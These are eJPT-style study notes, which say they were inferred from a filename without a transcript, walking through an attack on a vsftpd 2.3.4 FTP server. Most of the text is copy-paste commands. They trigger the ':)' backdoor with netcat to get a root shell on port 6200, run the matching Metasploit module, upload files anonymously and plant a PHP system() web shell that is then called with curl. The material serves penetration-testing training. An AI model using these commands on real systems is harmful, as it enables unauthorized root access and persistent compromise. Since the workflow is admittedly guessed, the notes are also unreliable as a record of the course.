# 01 - Exploiting A Vulnerable FTP Server (eJPT Study Notes)

Note: No transcript was provided. The following is a conservative, common eJPT-style workflow inferred from the filename and Linux exploitation context. This typically demonstrates exploiting vsftpd 2.3.4’s backdoor and basic FTP misconfigurations.

## What the video covers (Introduction / big picture)
- Discovering and enumerating an FTP service on a Linux target
- Identifying a vulnerable FTP server (commonly vsftpd 2.3.4 with a known backdoor)
- Exploiting the backdoor manually and via Metasploit to obtain a root shell
- Quick checks for common FTP misconfigurations (anonymous login, write access)
- Light post-exploitation validation

## Flow (ordered)
1. Host discovery and port scanning
2. Service and version detection on port 21/tcp
3. Run relevant Nmap FTP NSE scripts to identify issues (anon access, backdoor)
4. Manual vsftpd 2.3.4 backdoor trigger and shell retrieval on port 6200
5. Alternative: Metasploit module for vsftpd backdoor
6. Verify shell and perform basic post-exploitation checks
7. Optional: Check for anonymous FTP and upload vector if applicable
8. Document findings and cleanup

## Tools highlighted
- nmap (with NSE scripts: ftp-anon, ftp-vsftpd-backdoor, banner/service detection)
- ftp (standard client) or lftp (optional)
- netcat/nc (for shell on backdoor port)
- Metasploit Framework (msfconsole, exploit/unix/ftp/vsftpd_234_backdoor)
- curl/wget (optional, web checks if FTP is tied to web root)

## Typical command walkthrough (detailed, copy-paste friendly)

Set target IP once for reuse:
```
export IP=10.10.10.10
```

1) Fast discovery scan (optional if you know the target):
```
nmap -p21 -sV -sC -Pn $IP
```

2) Full port scan then focused service detection (optional but good practice):
```
nmap -p- --min-rate 10000 -T4 -Pn $IP
nmap -sV -sC -p21,6200 $IP
```

3) FTP NSE checks:
```
# Check for anonymous login
nmap -p21 --script=ftp-anon $IP

# Specifically test for vsftpd 2.3.4 backdoor
nmap -p21 --script=ftp-vsftpd-backdoor $IP
```

4) Manual vsftpd 2.3.4 backdoor trigger:
- The backdoor is triggered when a username containing “:)” is processed.
- After triggering, a root shell should spawn on TCP port 6200.

Trigger it:
```
# Using netcat to send the crafted USER and PASS
printf "USER test:)\r\nPASS anything\r\n" | nc -nv $IP 21
```

Connect to the backdoor shell:
```
nc -nv $IP 6200
# If successful, you should have a root shell. Try:
id
whoami
uname -a
```

5) Metasploit exploitation (alternative to manual):
```
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $IP
set RPORT 21
run
# Meterpreter/shell session should open as root; verify with:
getuid
shell
id
```

6) Basic post-exploitation checks (be ethical; only in authorized labs):
```
# From the shell:
id
hostname
ip addr
ls -la /
cat /etc/issue
# If a lab “flag” exists:
find / -type f -name "*flag*" 2>/dev/null | head
```

7) Optional: Check for anonymous FTP and writable paths
```
ftp -inv $IP << 'EOF'
user anonymous anonymous
pwd
ls -la
# Try upload if permitted (adjust local file path)
put /etc/hosts test_upload.txt
ls -la
bye
EOF
```

If the FTP root maps to a web directory (common in CTFs), try dropping a simple web command shell and call it via HTTP:
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
ftp -inv $IP << 'EOF'
user anonymous anonymous
put shell.php
bye
EOF

# Then from your box:
curl "http://$IP/shell.php?cmd=id"
```
Only attempt this if you confirm anonymous write access and the FTP root is served by a web server.

## Practical tips
- If the vsftpd backdoor is present, port 6200 only opens after you send a username with “:)”. If nc to 6200 fails, re-trigger and re-scan that port.
- Use nmap’s ftp-vsftpd-backdoor NSE script to quickly verify the vulnerability.
- If service banners are hidden or tampered, still try the backdoor trigger (harmless on non-vulnerable vsftpd; it just fails).
- If 6200 is filtered by a firewall, the Metasploit module may handle nuances better; otherwise, consider pivoting or firewall bypass if in-scope.
- Always check for anonymous FTP; misconfigurations often allow read or write, enabling data exfiltration or webshell drop (if FTP root maps to web root).
- Prefer passive mode in ftp clients when behind NAT/firewalls if you see data channel issues.

## Minimal cheat sheet (one-screen flow)
```
export IP=10.10.10.10

# Enumerate FTP
nmap -p21 -sV -sC -Pn $IP
nmap -p21 --script=ftp-anon,ftp-vsftpd-backdoor $IP

# Manual vsftpd 2.3.4 backdoor
printf "USER test:)\r\nPASS x\r\n" | nc -nv $IP 21
nmap -p6200 $IP
nc -nv $IP 6200
id

# Metasploit alternative
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $IP; run"

# Check anonymous FTP write (optional)
ftp -inv $IP << 'EOF'
user anonymous anonymous
ls -la
put /etc/hosts test.txt
bye
EOF
```

## Summary
- You enumerated an FTP service and identified the classic vsftpd 2.3.4 backdoor.
- You exploited it manually by sending a “:)” in the USER field, then connected to a root shell on port 6200.
- Alternatively, you used Metasploit’s exploit/unix/ftp/vsftpd_234_backdoor module.
- You also confirmed basic FTP misconfig checks (anonymous access, potential write) as a secondary path.
- This workflow covers discovery, verification, exploitation, and quick post-exploitation validation for a vulnerable FTP server on Linux.